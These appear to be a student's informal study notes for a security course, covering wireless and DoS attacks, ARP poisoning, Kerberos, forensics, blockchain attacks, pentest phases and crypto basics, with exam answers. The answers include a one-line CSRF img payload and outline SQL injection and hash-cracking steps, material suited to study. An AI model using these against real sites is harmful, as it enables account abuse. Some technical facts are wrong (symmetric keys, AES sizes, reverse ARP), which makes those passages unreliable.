when you set up evil twin, you are competing with actual point. signal strenght may fluctuate. to ensure evil twin strength is greater, do a deauthenticate to knock off the existing connection so victim can connect to the evil twin, or jam the channel between client and legitimate point so client has to connect to evil twin. 

hotspot hijacking is a secondary attack supporting the evil twin.

## dos
bandwidth flood - overwhelm the bandwidth of the target. if target can only service request at 100mb, get it overloaded to 150 mb requests all at one time

service request flood - can be http requests, dns queries, tcp connection requests. requests dont actually need to success, just use up resources

normal dos uses tcp backend. it does a syn, and receiver respon with syn ack but you dont respond with ack. so receiver is waiting. then you send another syn and it will think theres a new connection and repeat. this is a syn flood. firewalls nowadays can drop these

## distributed/reflected denial of service
drdos attacks focus on taking down the availabilty of an asset through an overwhelmign volumne of udp responses. in these cases, the attacker would send a udp as the protocol of choice for this type of attack as it does not establish connection state. 

reflectors send source address modified and unsolicited traffic to victim

attacker converts some of the endpoints to bots, and sends requests to the bot. it changes the sender requests to the bot. so requests seem to come in from bot. 

## bots, zombies and botnets
bot - a type of maliciosu software (malware) which allows attacker complete control of the computer

zombie - an internet connected computer infected with bot

botnet is a collection of zombies all used to do things like ddos

iot botnet - iot devices used as zombies. os of iot devices is usually stripped down version of linux, which means malware can be easily compiled for the target architecture

## packet sniffing, insecure channels
put nodes into promiscuous mode - hubs
use arp poisoning - switches

## passive sniffing
passive sniffing involves used of a sniffer to monitor network packets. passive sniffing relies on promiscuous mode feature of a network interface controller nic.

passive sniffing is difficult to detect, but does not work well in switched networks

hub is a broadcast device so any devices connected can hear the communication between a pair. attacker just need to connect to hub and set to promiscuous mode and can hear all communications. 

## active sniffing
active sniffing is required to bypass the segmentation that switches provide 

packets injected into the network switch that causes traffic for other nodes to be sent to the attackers system 

active wireless sniffing involves sending out multiple network probes to identify access points

switch connects only one pair so you cant use port mirroring as it needs permission. only way is to use arp spoofing or poisoning. so it looks like you are the actual device when other devices wants to communicates

## address resolution protocol arp
primarily used to translate ip addresses to ethernet mac addresses. the device driver for ethernet nic needs to do this to transfer packet

the mac (media access control) address is a physical machine address.

each hosts maintains a table (arp cache) of ip to mac addressses.

it switches or converts ip address to machine value. if you look at laptop, the laptop has an ip. so if theres an address sent to the laptop, its only going to a specific card called nic. the nic has a mac address, so the arp needs to convert. if you want to send something to the internet, you will need a reverse arp. reverse arp changes mac address back to ip. this happens for every endpoint

### how arp works
source hosts has an arp table. first the source computer will "broadcast" (swtich network does broadcast but as a multi cast/repeated casting way) to the network on who is the ip address associated. the device with that ip address will send back with its mac address. the source will store the ip and mac address in its arp table. but this has no checking. because of that, you can do arp spoofing/poisoning

## arp spoofing/poisoning
a forged arp reply is sent to the source computers. can be unsolicited

the source computers arp cache is updated with a forged entry. 

arp cache entries are not long lived because network adapters can be changed.

by spoofing the network switch, all hosts on the subnet will route through the attackers machine. 

youll have to poison the arp cache of every hosts on the subnet

ip conflict possibiltiy.

should not spoof ip of another client, two clients cannot have same ip

two clients can have same mac addresses but differnet ip addresses

machines get ip addreses dynamically with dhcp, their ip address may change from time to time and thus triggers no special warning

### arp poisoning via broadcast request
attacker will broadcast ip addresses of itself.

host C (attacker) sends a broadcast arp request claiming it has a certain ip

host A and host B receive the broadcast. Host A updates its arp cache with the attackers mac address

there is no conflict unless host B sends an unsolicited response. host A will direct traffic intended for host B to host C (attacker)

### arp poisoning via request response 
host A sends arp request asking for mac address associated to a certain ip

host B (legit) replies with its mac address

host C (attacker) also replies with its own mac address after a delay

host A updates its arp cache associate with that ip with attackers mac address.

### arp poisnoning via unsolicitated response
nobody issues request, you just do a response so all those that are receiving it will update their arp cache.

host C (attacker) sends an unsolicited arp reply with ip address and mac address

host A receives unsolicited arp reply and update its arp cache

host A associates the attackers mac address with new ip address. traffic intended for that ip is redirected to attacker. 

in a zero trust model, routers may be in different departments. 


## tls/ssl replay attack
client verifies certificate and generates a symmetric session key for this connection, session key encrypted with public key and sent to server

ipsec and tls/ssl mitigate mitm and data integrity attacks

cannot mitigate replay attacks

first server has to authenticate itself by sending a digital dertificate with signature and corresponding public key. client has to check: 1) use verisign to authenticate 2) use the public key to authenticate. when you use a key to do encryption, you are forming a signature. after youve done that check that the signature is the same as the one sent by server. once all checked, the client will then generate a session key and encrypted by public key. subsequent communication will take place. thing is, we cannot mitigate replay attacks. if server sends over the signed cert and key, it does not know it is sending to a valid client. 

a replay attack is a network attack where valid data transmissions is maliciously or fraudulently repeated or delayed. in the context of tls/ssl transport layer security/secure sockets layer, a replay attack involves intercepting and retransmitting the data packets between a client and a server to trick the server into performing a task again or to gain unauthorized access.

tls/ssl is designed to prevent mitm, but cannot protect against replay attacks because:
- session keys: if attacker captures the handshake messages, they can replay the encrypted session key to server
- lack of nonce or timestamp verification: tls/ssl does not use nonces or timestamps to verify. server cannot distinguish a legitimate requests and a replayed one
- stateless protocol: stateless server does not keep track of past handshakes. can process replayed handshakes as new

## conditions for replay attack
- client isnt authenticating to the server

## kerberos 
kerberos is a protocol SSO which aims to let users and services authenticate themselves to each other using tickets

a mutual authentication protocol for networks

commercial product, single sign on system - only need to sign on once. focuses on removing or preventing replay attacks.

## distributed authentication
compare kerberos with a distributed system

distributed system - one system for email, one for printing, one for file access etc. if you have such system, you need to log in multiple times. ideally, you will need three different sets of authentication. more complication when chanigng - need to change all three. system maintenance also more involved, youll have three systems to maintain

to solve this, we will have one server for authentication, and one separate server for services. 

1. the user will single sign in once
2. the authentication server authenticate
3. the authenticated server will send along an encrypted key (service server key msg). the msg is the ticket to use the service for the service server
4. the encrypted key and msg cannot be decrypted by the user. it is only known between the authentication server and service server
5. all user has to do is to forward the service server key (msg) to the service server, the service server will decrypt and return the user the service (slides example is email)

the problem is that there can be a replay attack. this system does not stop deplay attack

## centralised authentication 
1. now, there is a ticket. it contains the user id, and service server id.
2. user log in, the authentication server will authenticate
3. the authentication server sends a ticket to user, who forwards it to service server to decrypt
4. if service server checks that it comes from user, it will permit the email to be retrieved 

with this approach, the service ticket only provides one type of service. we need to log in a second time for a new service ticket for other services. brings us back to distributed service. 

## ticket granting service

now have a new ticket granting service tgs for multiple service.

we only need to sign on once. 

ticket granting ticket has user id, tgs id, user address, timestamp, lifetime

service ticket has user id, user addres, service server id, timestamp, lifetime

why need timestamp and lifetime? if lifetime service ticket has not expired while you use a service, you can send another service request. to prevent replay, dont make timestamp too short or too long. 

but there are still problems. 
- can spoof user by intercepting tgt, and ticket request still valid in timestamp and life time
- attacker can still spoof by copying the encrypted service ticket and send user id along with the encrypted ticket and if its not expired, can still replay
- a service cannot determine that the person sending the ticket is actually the tickets legitimate owner
- we need to authenticate user to tgs and service servers but they dont have a shared secret.

now the server has authenticated itself to the user, but the user has not authenticated itself to the server

## kerberos
the ticket now has additional session key

### kerberos authenticator
authenticators should only be used once with short lifetime - servers maintain a cache of recently presented authenticators (replay cache)

authentication service and ticket granting service are logical servers

a replay cache keeps trakc of all authenticators recently presented to a service. if a duplicate authentication requests is detected in the replay cache, an error message is sent to the application program.


## kerberos thing to remember

machines need to be time synced - reference time frame need to be maintained for consistent time stamps and ticket lifetimes. 

tickets and keys are stored on the users machine . if compromised identity can be forged 

key distribution centre is a single point of failure


# [PRAC] network security practice questions
1ai) 
- no password, anyone can log into the server
- no firewall, dos and ddos may occur
- anyone can do port scanning
- anyone can do war driving
- spoofing and sniffing may occur
- attackers can intercept the network traffic

1aii) 
- set a password on router
- set up a fire wall
- use a switch instead of a hub
- use vpn 
- filter or close ports if unused

2a) when arp is to be checked with other devices in a switch network, during the multicasting of IP and mac addresses, there is no way of authenticating those mac addresses. 

3)

ALLOW   TCP     ANY         10.254.1.173       80
ALLOW   TCP     ANY         10.254.1.173       443
ALLOW   UDP     ANY         10.254.1.101       53
DENY    TCP     ANY         ANY                53
DENY    IP      ANY         ANY                53

4)
XSS attack is when attacker injects malicious scripts into user inputs. this means the the signature based anti virus scanner will not have a full databased of all the scripts. 

the signature based antivirus also needs to be constantly updated to be relevant, as viruses are constantly changing. 

5)
have html slots for untrusted data, sanitize and validate user input, have escape characters such &gt

6)
teach them about social engineering awareness 

enforce best security practices

# [LECT] digital forensics

digital evidence in crimes is on the rise. not just things like hacking, but otehr crimes may now leave a digital audit trail

aim is to find, preserce and analyse digital data and if its to be used in a criminal case, then must be admissible in court

find evidence after crime has been committed

over lan wan or internet

## what evidence
- email
- credit card data
- accounting software and files
- notes
- images
- internest history
- ip address
- logs, to track user activity
- malware

evidence would be digital in nature

## application area
- criminal investigations
- civil cases - disputes between persons or organizations
- private investingations
- digital forensics refers to the collection and exmination of evidence from electronic sources with digital storage

digital forensics is a science, which means scientific methods are applied. key is that results are repeatable and reliable.

digital forensics is assigned, cannot anyhow measure and record data. means if you extract a data with one tool, and someone else extract data with the same tool, both results need to be same

## process model
one example process is pollitt
1. **acquisition** of evidence in a lawful manner
2. **identification**, aim is to identify and collect the digital data which can be used as evidence
3. **evaluation** of data relevant to the case and whether it can be used in a case
4. **admission/presentation** of the evidence to present in the court of law

no one standard process model for digital forensics investigations

identification hasnt started to analyse the evidence. it is to decide what you want to collect. 

admission is to document the evidence. you cant put doen every results, if its not reliable and repeatable cannot be presented. there must be a preservation of evidence at all stages; cannot change the data so you can prove you did not change data at all the different stages.

## chain of custody
who what where why when 

whichever process model you follow, throughout it theres a chain of custody which is essential to ensure you have evidence which is admissible

- who had evidence, what is it, what was done with it, where was it, why did they have it, when idd they have it
- doc identifies all changes in the control, handling, posession, ownership or custody of a piece of evidence
- need to be able to trace the route that evidence takes from the moment you collect it until the time it is presented in court or at a briefing
- if the chain of custody is brokem, the evidence is no longer reliable as it could have been tampered with

if chain of custody is proven to be broken, you lose the case.

## evidence integrity
throughout you also want to maintain the integrity of data

the purpose is to demonstrate that the evidence you collected is the evidence whihc is analyzed and presented. 

## acquisition
be aware of volatile and latent data

aim is to get an image of the data

problem - data on computers is volatile, sometimes as simple as a mouse click could mean loss of information, shutting down a system could activate a program which attemtps to delete/encrypt the suspects file

also its latent, you may not know its there.

image is an exact replica of the contents of a storage device such as hdd

when device is on dont turn it off, there can be decrypted data and keys that could be relevant to crime, and if you trigger an algorithm to reencrypt everything or delete everything that is vital to the crime, you could lose valuable data/evidence. 

### static acquisition 
copies a harddrive from a system which is shut down -> static

leaves data unaltered, write blocker

a write blocker is a piece of hardware which allows acquisition to occur without accidentally altering the data on the drive, achieved by allowing read but blocking wirte commands

output of this process is the image of the disk

### live acquisition
copies data from running machine, capture temp files and malicious payloads

collects from ram as well, capture authentication credentials and keys

capture of network traffic, rare as forensics usually post mortem. botnet verification, presense of rat

risky, may alter data, run forensic live dvd, mount disk image

### acquisition problem
digital forensics acquisition, try to leave a device in the state it is in

if its off, dont turn it on. if its on, dont switch it off

this is because both actions could change data on machine

### storage
we need to store materials in a state which allows them to be unaltered. this can be achieved using tools like faraday bads, tents and shielded rooms

### image formats 
raw
- straightforward, bit by bit 
- advantages - most forensic tools can read this format, fast
- disadvantages - takes as much space as the original, need to store the validation (hash) separately from the image

proprietary
- formats provided by companies who produce commercial software/hardware for digital forensics
- advantages - can provide compression and store validation and other metadata with image
- disadvantages - limited to single tool, cannot share evidence, cost

most tools can process raw format. proprietary may be more efficient, but it is more tied to a certain vendor. raw takes up too much space and takes too long. 

## identification and collection
physical layer
- identifies and recovers data across the entire physical drive without regard to file system 
- techniques such as file carving, key word searching

logical layer
- identifies and recovers files and data based on the installed operating systems, file systems and/or applications
- techniques such as extracting file system structure, file meta data, recovery of deleted files, searches based on extension

identification is takign out data for evidence. we can extract them either physically or logically. logical layer is where the tool can recognize file heirachy so you can select

## evaluation
- searches keywords, dates, file types
- log files analysis
- examine emails, file content
- internet history examination
- time frame analysis

evaluation is the process of interpreting the extracted data to determine their significance to the case. idea is to find evidence which supports or disproves your hypothesis in an investigation 
large logs - data analytics with ML

## presentation/admission
what might a report include
- description of case
- the people involved
- details of the chain of custody for collected evidence
- details of tools used
- any hypotheses formed
- steps taken during the examination
- results/conclusion

## how can someone slow the investigation
- wiping harddrive, overwrite data to make it unrecoverable
- modification of files metadata
- using steganography
- encrypting or compressing artifacts


# [PRAC] digital forensics practice questions
a) the purpose of chain of custody is to ensure that evidence is preserved throughout all steps of digital forensic process. it is a document for handling and storage of evidence.

it preserves the integrity of evidence so the evidence can be repeatable and remain reliable. this document would prove the integrity of the evidence when submitted.

b) google for hashed passwords using md5 due to the possible collision.

write a script to auto generate hashed passwords with md5 for a possible collision

if it fails, brute force password sha256 hash, or use rainbow table 

# [LECT] block chain

## centralized systems in economy
centralized systems are prone to single points of failure, lack scalability and have higher costs

## decentralized systems in digital economy
decentralized systems do not have single points of failure, have better scalability and reduced costs

decentralized payment systems enable better privacy control by individual entities, individual transactions are distributed and each miner strives to maintain the same state as the rest. 

## how block chain works
1. A wants to send money to B
2. transaction is represented as block
3. the block is broadcasted to every node in the network 
4. sufficient miners approve the transaction
5. transaction is added to the blockchain 
6. B receives the money

## what is a blockchain
a chain of blocks that contain info on validated transactions 

secure, distributed ledger, prevents unauthorized data changes 

it includes two protocols:
- achieve consensus 
- determining membership

a blockchain network consist of multiple computers that process and validate all transactions

ideally sutied for storing infor that cannot be faked eg money

blockchain networks can be global or run between two organization and remove need for 3rd party intermediary 
- agreement or contract embeded in code and protected from tampering
- proof of existence system, ip ownership via time stamping

## what is a block
chain of blocks containing info, what is stored in block depends on type of blockchain

a block contains info about sender, receiver, number of bitcoins to be transferred

the first block in the chain is genesis block 

each new block in chain is linked to previous block 

## what is in a block
each block has a hash that is unique to it

the hash identifies the block and its contents, once block is created, any subsequent change within the block will change its hash. 

each block has
1. data
2. hash
3. hash of previous block except genesis block

## how secure is it
hashing and proof of work make block chain secure. 

changing the contents of one block makes the subsequent block invalid

although computers can calculate hundreds of thousands of hashes per second, attacker can tamper a block and recalculate all hachsed of other blocks to make the block chain valid again

to avoid this, blockchains use proof of work, a computational problem that takes certain effort to solve, slow down creating of new blocks

## p2p network
a distributed p2p network is used, everyone is allowed to join

each entity in the blockchain network is referred to as a node

when a node creates a new block, block is sent to all nodes in the network 

when new node joins the network, it will get a full copy of the blockchain 

all node must agree about which valid blocks and which are not - consensus/proof of work

consensus protocols are mechanisms by which all nodes maintain integrity and security of the blockchain

## proof of work 
it takes almost 10 mins to calculate the required proof of work

a proof of work is a computational problem that takes considerable effort to solve. 

but the time requireed to verify the results is considerably less

this kind of mechanism makes it quite tough to tamper with the blocks, so even if you tamper a single block, you will need to recalculate proof of work for all following blocks. 

hashing and pow make block chain secure

pow consensus algorithm requires each node in the block chain network to solve a computationally complex problem. the first node that solves the problem and verified by others is granted permission to add a new block and the miners are awarded cryptocurrency tokens for their work.

pow is a consensus algorithm used to confirm transactions and generate new blocks to be added to a chain

the gathering of all confirms transactions into a chain of blocks is supported by miners 

confirming transactions involve generating the solution to a complex mathematical problem

the solution to this complex problem is another hash and takes some time 

however proof of the solution takes much less time

## tampering with a block
nodes in the network will reject blocks that are tampered with

to successfully tamper with blockchain, you will need to 
- redo the proof of work for tampered block
- take control of more than 50% of p2p network 
- OR, tamper wiht all blocks on a chain 

based on computational complexity, this is practically infeasible task. hence blockchains are resonably secure. 

## what is inside a block
blockchain comprises of 100,000s of blocks, each blocks can contain up to several thousand transactions. memory space and computing power are two big challenges. 

it is advantageous to use as little data as possible when processing and verifying transactions. it not only reduces cpu processing times but also ensures a higher level of security. 

## merkle tree
in most cases a merkle tree comprises of two child nodes under each node on the network.

merkle tree are used to organize transactions more efficiently. 

merkle root is 32 bytes in size, and is then taken to be placed inside block header. it represents a summary of all transactions. each block in a blockchain has one merkle root

without merkle tree, when comfirning a past transaction a node woul need to get copies of the ledger from peers. the node would need to compare each entry line by line to make sure its own records and the network records matched exactly. if there was any discrepancy between the ledgers, it could compromise the security of the network. 

## 51% attack
if a single miner hashing power accounts for over 50% of the toal hashing power of the entire blockchain. 51% attack can be launched to intentionally exclude or modify ordering of transactions, prevent transactions from being confirms, prevent other miners from mining

### 51% attack mitigation
blocks that have been mined privately is a predictor for a 51% attack

these privately mined blocks are penalized with a block acceptance delay in relation to the amount of time the block has been hidden from the public network

helps to mitigate an important mechanism of 51% attacks; malicious private chain that is created concurrently with the developing public chain it is trying to hijack

if an attacker chooses to make their blocks public, an attack can be anticipated and counteractive measures can be taken such as temporarily increasing block confirmation time. 

komodo - uses a network of 64 nodes elected by blockchain community annually spread across the globe

these nodes have one function - to take the latest block data and store it in litecoin ledger with time stamp

the data stored on ltc blockchain effective gives komodo nodes an anchor to which it can reference to find latest legal block in case of an attack

komodo timestamps/notarizes the block data via function known as op_return

no blocks or transactions that occurred prior to a notarization can be changed, this makes blockchain completely immutable.

## double spend attack
double spending refers to consumer who uses same crypto currency multiple times for transactions. an attacker could leverage a race attack to initiate double spending, the attacker just needs to exploit the intermediate time between two transactions initiation and confirmation to quickyl launch an attack. before the second transation is mined to be invalid, the attacker already got the first transaction output resulting in double spending

a second version makes use of attackers ability to do 51% attack. the attacker has superior computational power at his disposal. this allows him to create new blocks at a faster rate than other miners, leading to a generation of new ledger (longer chain) containing incorrect information. subsequent new blocks created by other miners can also join this new ledger.

## ddos attack
most common type of attacks on blockchain networks - attacker aim to disconnect mining pools, ewallets, crypto exchanges, other finanacial services of the network 

blockchain can also be attacked at its application layer when hackers with ddos botnets

### ddos mitigation
gladius - rent decentralized bandwidth from other blockchain systems 

use protection pools that are filled with unused bandwidth to mitigate ddos attakcs

each decentralized protection pool adds more bandwidth for ddos traffic to use. with all the bandwidth being used, ddos will capout its maximum usage

blockchain peers on surface web would have regular ipv4 or ipv6 addressed nodes that can be address-mapped/located via regular dns name server resolution. these ndoes render themselves vulnerable to ip specific jamming attacks like dos or ddos

either implement the blockchain in the dark web or have tor dns proxy resolve the node addresses to some reserved private subset

tor service creates a service descriptor containing public key and introduction points

intro points are selected access points for clients to the blockchain service in dark web

service descriptor signed with private key of the block chain service and uploaded to db 

client requests for service needs to downlaod descriptor from db

if requested descriptor exists, client also received introduction points and public key. 

client establishes a rendezvous point with otp

client sends introduce messages containing rendezvous point addess and otp encrypted with public key to an introduction point, requesting block chain service. 

# [PRAC] blockchain practice questions
1)
benefits - increased security, blockchain does not contain info on who owns or uses the data, so biometrics provide a mean of identification

limitation - biometric is personal and private identification. blockchains requires everyone to hold a ledger, which includes every single block. should biometric be used on blocks, this means that everyone would have each other's biometric data. 

2)
komodo is a network of nodes on the litecoin which the block chain community elects annually. this node takes the latest block from the blockchain, notarizes it, and store it. this means that komodo will have an anchor block to reference to as the latest, most legal block.

should there be a race condition, komodo will check which is the latest block to see if the transaction is valid and either reject or approve the respective transaction.

3)
ddos attack. it denies the service of transactions to wallets. since blockchain on surface web is ipv4/ipv6 addressed nodes, it is vulnerable to ip specific attacks such as ddos. 

defense: implement blockchain on dark web or use TOR dns proxy ro resovle node addresses 

4)
the block chain has a ledger issued to everyone on the peer network. this ledger is a network of blocks on the blockchain. should a transaction happen, everyone's ledger would need to verify this transaction. if majority of the ledgers accept this transaction as valid, it will go through. 

**correction** a blockchain keeps a ledger of transaction blocks that grow in size progressively from new transaction blocks added. each transaction block is verified by a hash that includes the transaction of earlier blocks. the verification process is carried out by all blockchain memebrs and at least majority of members must agree on the hash value. 

5)
unit of data


single point of failure  
block chain has multiple poitns of failure as peer to peer
rdbms has single point of failure


centralized control
block chain decentralized
rdbms centralized

performance
bc slower 
rdmbs faster

data transparency
bc has transparency
rdbms no transparency

editing/deleting data   
bc cannot delete data
rdbms can delete

# ethical hacking

## computer misuse act
unethical hacking is against the law
- unauthorized access to computer material 
- unauthorized access with intent to commit or facilitate a crime
- unauthorized modification of computer material 

## types of hacker 
white hat hacker
- legally authorized to conduct hacking 
- the computer security professional who uses skills to help 
- hacking as job to help secure systems and provide insight into policies and procedures 

black hat hacker
- hacks illegaly without authorization
- comptuer security expert who uses skills to steal, damage, destroy
- hacking for personal gain or motive

gray hat
- sometimes good, sometimes bad
- methods may cross legal and ethical boundaries
- may transfer vulnerability knowledge to either systems owner or black hat 

## types of pen testing 
black box 
- attack in stealth/covert
- attacker have minimal or no preknowledge of the target system 
- employees may be tested

white box
- tester aiming to be thorough within the permitted scope
- detailed info regarding target is known
- tests all known aspects of a system/network and doesnt try to cover their tracks 

## pen testing activities 
- reconnaissance
- scanning and enumeration
- exploitation/gaining access
- post exploitation/maintaining access
- covering tracks

### reconnaissance
gathering info about the target

#### passive vs active
passive - gathering info without the targets knowledge
active - interacting directly wiht the target who may log our ip addresses and activity, may be illegal if unauthorized 

Goal: gain access to the systems inside the target network 
looking oor:
- internal ip
- what technology they use
- what os they use
- what defence they have

#### trace route
tracert <domain name>

enables neighbor with potentially lower security to be found

facilitates lateral movement and indirect target exploitation

### scanning and enumeration
after recon, you should have a list of ip addresses which you are authorized to hack 

scan ports on each ip addresses

allows you to identify open ports and services running on the targets, could be used for exploits

#### pings 
used to determine if a system is alive

special type of internet control message protocol packet

#### ping sweeps 
pings are good for host discovery 

manually completing individual pings is time consuming

ping sweeps can be completed using tools like zenmap

#### port scanning 
identify specific ports and services runnign on a particular host

#### nmap scripting engine
verify findings from initial port scan

discover new processes and vulnerabilities

automate pen testing techniques

#### remote access
attempt to login to any remote access services discovered during port scan

#### vulnerability scanning vs pen testing
pen testing performs exploitation and proof of concept attacks to show actual vulnerabilities

vulnerability scanning review systems for potential security issues

#### scanning vulnerabilities 
locating and identifying known weaknesses in the service and software 

can be completed using a vulnerability scanner

### exploitation
know waht exploits can be run agaisnt the known vulnerabilities 

exploit with suitable technique and tool

ultimate goal is to get admin access

edge computing - side channel attacks 

### post exploitation, maintaining access
most payload wont give permanent access to system, only temporary

post exploitation phase performs actiosn to create a permanent backdoor to the system

this allows admin rights to survive program closures and reboots

### covering tracks
after an attacker compromises a machine and completes the attack or creates a backdoor, he has to ensure that his presence is removed or remains hidden.

similarly when ethical hacker completes work, target machine has to be restored 

hiding files, folders, accounts

installign rootkits

clean up log files, trojans

restore target machine 


## penetration test report
pentest scope and objectives

report findings during pentest

specific advice on hwo to close the vulnerabilities

steps to be followed by clients in future

delievered directly to an officer of the client organization


# cryptography

## types of cryptography
- symmetric: public and private key same
- asymmetric: public key for encryption, private key for decryption, both different

## symmetric cryptography
- substituition ciphers: replaces plaintext characters with another in a fixed pattern
  - monoalphabetic
  - polyalphabetic
- transposition ciphers: simple encryption scheme which plaintext characters are shifted in some pattern to different position
  - simple transposition
  - rail fence
  - columnar transposition

## caesar cipher 
letters shifted along the alphabet to encrypt
shifted back same amount to decrypt

## des 
64 bit plaintext block undergoes 16 rounds

transposition, substituition, xor of plaintext and sub key

56 bit key used to generate 48 bit sub key every round, 8 bit left discarded

## aes
number of round depend on key size, 10 rounds 128, 12 rounds, 196, 14 rounds 156

key size 128, 192, 256

transposition, substituition, xor of plaintext and subkey



## rsa key 
n=p*q
totient function = (p-1)(q-1)
pick e, less than totient function, co prime with totient function
d*e mod totient = 1

public key is (e, n)
private key is (d,n)



# exam qns

1a)
use a union 

first find out all the possible columns by using order by

find out all vulnerable columns by using cat -1

find the list of columns by using groupby(table_schema) and union select all columns

concat all possible rows of that column for account records

1b)

|   password -> client -> hash password   |      ->        | hashpassword -> server db |

|                ^--- salt               |



1c) multifactor authentication using one time password to be added with password login

2a)
reflected - not stored, reflected off the web application. attackers sends a malicious script into user input

stored - stored in the database, in places such as forums, attacker craft a malicious script, send it into database. when user opens the page that loads the db, the script executes

dom based - stored in document object model, client side attack. attacker writes a script and creates url, send it into the user. occurs when the website receives the request, executes a script which would also execute the malicious script. 

2b)
sanitize user input

html sltos for untrsuted data

escape cahracters

cross site scripting does not need to be logged in at user level, csrf needs

3a)
when a transaction is made, a transaction block is created and added to the blockchain. everyone's ledger will be notified and requires majority of the community in the blockchain to approve the transaction. 

correction: blockchain keeps a ledger of transaction block and shared with everyone on the blockchain. each block verified by a hash which includes the previous transaction. at least majoring of the member must agree on this transaction 

double spending: when attacker creates a race condition of more than 1 transaction

komodo: a list of 64 nodes elected by community that notarizes the most recent valid blocks and take them as an anchor. takes the most recent block data and store it on a blockchain (bitcoin or litecoin). no blocks or transactions prior can be changed.

currency, healthcare medical records 

4a) attack uses social engineering, malware infection through the network, key logging occured

employee awareness, firewall, stronger access control (rbac, mandatory), audits and monitoring 

isolate it first

search log files

static analysis - look at source code

dynamic analysis - monitor it running


5)

steganography 
main purpose - to hide visible information in plain sight, to conceal
data visibility - not visible, only cover materials like image visible
data structure - hidden in lossless format, does not change data strucutre
discovery - harder to detect, can be discovered using stegoanalysis

cryptography
main purpose - encrypt data during transmission to protect
data vilisbility - cipher text is visible, not understandable
data structure - changes data structure
discovery - easier to detect as altered data


1)
lsb algorithm makes use of the lsb of every 8 bit color channel without splitting them up. it is simpler and more suitable to embedd small amounts of data, but can be easily detected

bcps algorithm requires every bit position to be split into 8 different channels, where the lsb gives details and msb gives overall look and quality to analyse areas here data can be better hidden. it will then embed the data into the most complex byte segments. it can have higher capacity as it uses image complexity to find optimal areas. but is more complex and more computationally intensive

split the image into individual bit planes, if theres 24 bit image, you will have 8 bit planes for individual red green blue channels, so 24 bits planes

measure the complexity. see how often the bit changes by using number of changes/maximum number of changs (2*7*8) in an 8 byte segment. compare it with a threshold, typically about 0.3. if its more than threshold, its compplex enough. hide the data in that bit plane.



2)
<img src ="http://www.coolsite.com/delete.php"></script> 

the user must be logged in

create a malicious link that deletes the account

embed in an img or link and use social engineering to send it to the user for it to be clicked

hide the challenge tokens in the php. when this php is executed, the server would require the challenge token to be validated. since the challenge token can expire, the attacker may not be authenticated as a valid user 

